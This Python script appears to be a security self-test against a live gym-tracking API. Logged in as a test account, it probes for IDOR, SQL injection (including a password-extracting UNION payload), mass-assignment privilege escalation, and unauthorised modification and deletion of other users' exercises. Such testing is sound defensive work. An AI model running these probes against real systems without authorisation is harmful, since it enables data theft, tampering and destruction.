# -*- coding: utf-8 -*-
"""
Test as Normal User - Create Data then Exploit
"""
import requests
import json
import sys

if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

API_URL = "https://gym-api.algorynth.net"

print("="*80)
print("NORMAL USER EXPLOITATION TEST")
print("="*80)

# Step 1: Login as test user
print("\n[STEP 1] Login as test_security@example.com")
print("-"*80)

login_data = {
    "email": "test_security@example.com",
    "password": "TestPass123!"
}

try:
    r = requests.post(f"{API_URL}/api/auth/login", json=login_data, timeout=5)
    print(f"Login Status: {r.status_code}")
    
    if r.status_code == 200:
        data = r.json()
        TOKEN = data['token']
        USER_ID = data['user']['id']
        print(f"âœ… Logged in as User ID: {USER_ID}")
        print(f"Token: {TOKEN[:50]}...")
    else:
        print(f"âŒ Login failed: {r.text}")
        exit(1)
except Exception as e:
    print(f"Error: {e}")
    exit(1)

headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

# Step 2: Create some exercises
print("\n[STEP 2] Creating Exercises")
print("-"*80)

exercises = [
    {"name": "Bench Press", "description": "Chest exercise", "category": "strength"},
    {"name": "Squat", "description": "Leg exercise", "category": "strength"},
    {"name": "Running", "description": "Cardio", "category": "cardio"}
]

created_ids = []

for exercise in exercises:
    try:
        r = requests.post(f"{API_URL}/api/exercises", json=exercise, headers=headers, timeout=3)
        if r.status_code in [200, 201]:
            response_data = r.json()
            print(f"âœ… Created: {exercise['name']} -> ID: {response_data.get('id', 'N/A')}")
            created_ids.append(response_data.get('id'))
        else:
            print(f"âŒ Failed: {exercise['name']} -> {r.status_code}: {r.text[:100]}")
    except Exception as e:
        print(f"Error creating {exercise['name']}: {e}")

# Step 3: Get my exercises
print("\n[STEP 3] Retrieving My Exercises")
print("-"*80)

try:
    r = requests.get(f"{API_URL}/api/exercises", headers=headers, timeout=5)
    print(f"Status: {r.status_code}")
    
    if r.status_code == 200:
        my_exercises = r.json()
        print(f"My exercises count: {len(my_exercises)}")
        
        for ex in my_exercises:
            print(f"  - ID: {ex.get('id')}, Name: {ex.get('name')}, User ID: {ex.get('user_id', 'N/A')}")
except Exception as e:
    print(f"Error: {e}")

# Step 4: Try to access other users' exercises (IDOR)
print("\n[STEP 4] IDOR Test - Access Other Users' Data")
print("-"*80)

# Try IDs that are not ours
test_ids = [1, 2, 3, 100, 999] + created_ids

for test_id in test_ids:
    try:
        r = requests.get(f"{API_URL}/api/exercises/{test_id}", headers=headers, timeout=3)
        
        if r.status_code == 200:
            data = r.json()
            owner_id = data.get('user_id', 'N/A')
            
            if owner_id != USER_ID and owner_id != 'N/A':
                print(f"  ðŸš¨ IDOR VULNERABLE: Can access Exercise ID {test_id} (belongs to user {owner_id})")
                print(f"     Data: {str(data)[:150]}")
            else:
                print(f"  âœ… ID {test_id}: Own exercise")
        elif r.status_code == 403:
            print(f"  âœ… ID {test_id}: Access denied")
        elif r.status_code == 404:
            print(f"  - ID {test_id}: Not found")
    except:
        pass

# Step 5: Try to modify other users' data
print("\n[STEP 5] Unauthorized Modification Test")
print("-"*80)

for test_id in [1, 2, 3]:
    try:
        malicious_update = {"name": "HACKED", "description": "Unauthorized modification"}
        r = requests.put(f"{API_URL}/api/exercises/{test_id}", 
                        json=malicious_update, 
                        headers=headers, 
                        timeout=3)
        
        if r.status_code == 200:
            print(f"  ðŸš¨ VULNERABLE: Modified exercise {test_id}")
        elif r.status_code == 403:
            print(f"  âœ… Modification blocked for ID {test_id}")
        elif r.status_code == 404:
            print(f"  - ID {test_id}: Not found")
    except:
        pass

# Step 6: SQL Injection with real data
print("\n[STEP 6] SQL Injection with Query Parameters")
print("-"*80)

sql_payloads = [
    {"name": "' OR '1'='1"},
    {"category": "' OR 1=1--"},
    {"search": "bench' UNION SELECT password FROM users--"}
]

for payload in sql_payloads:
    try:
        r = requests.get(f"{API_URL}/api/exercises", params=payload, headers=headers, timeout=3)
        
        if r.status_code == 200:
            data = r.json()
            if len(data) > len(my_exercises):
                print(f"  ðŸš¨ SQL INJECTION: Payload {payload} returned {len(data)} items (expected {len(my_exercises)})")
            elif "password" in str(data).lower() or "user" in str(data).lower():
                print(f"  ðŸš¨ DATA LEAK: {payload} -> {str(data)[:200]}")
    except:
        pass

# Step 7: Mass Assignment (Privilege Escalation)
print("\n[STEP 7] Privilege Escalation via Mass Assignment")
print("-"*80)

try:
    privileged_exercise = {
        "name": "Admin Exercise",
        "is_public": False,
        "user_id": 1,  # Try to assign to admin
        "role": "admin",
        "is_admin": True
    }
    
    r = requests.post(f"{API_URL}/api/exercises", json=privileged_exercise, headers=headers, timeout=3)
    
    if r.status_code in [200, 201]:
        response_data = r.json()
        print(f"Status: {r.status_code}")
        print(f"Response: {response_data}")
        
        # Check if forbidden fields were accepted
        if response_data.get('user_id') == 1:
            print(f"  ðŸš¨ MASS ASSIGNMENT: Set user_id to 1 (admin)")
        if 'role' in response_data or 'is_admin' in response_data:
            print(f"  ðŸš¨ PRIVILEGE ESCALATION: Admin fields accepted!")
    else:
        print(f"  âœ… Mass assignment blocked: {r.status_code}")
except Exception as e:
    print(f"Error: {e}")

# Step 8: Delete other users' data
print("\n[STEP 8] Unauthorized Deletion Test")
print("-"*80)

for test_id in [1, 2]:
    try:
        r = requests.delete(f"{API_URL}/api/exercises/{test_id}", headers=headers, timeout=3)
        
        if r.status_code == 200:
            print(f"  ðŸš¨ VULNERABLE: Deleted exercise {test_id}")
        elif r.status_code == 403:
            print(f"  âœ… Deletion blocked for ID {test_id}")
        elif r.status_code == 404:
            print(f"  - ID {test_id}: Not found")
    except:
        pass

# Summary
print("\n" + "="*80)
print("EXPLOITATION SUMMARY")
print("="*80)
print("\nLook for ðŸš¨ markers above indicating vulnerabilities")
print("="*80)
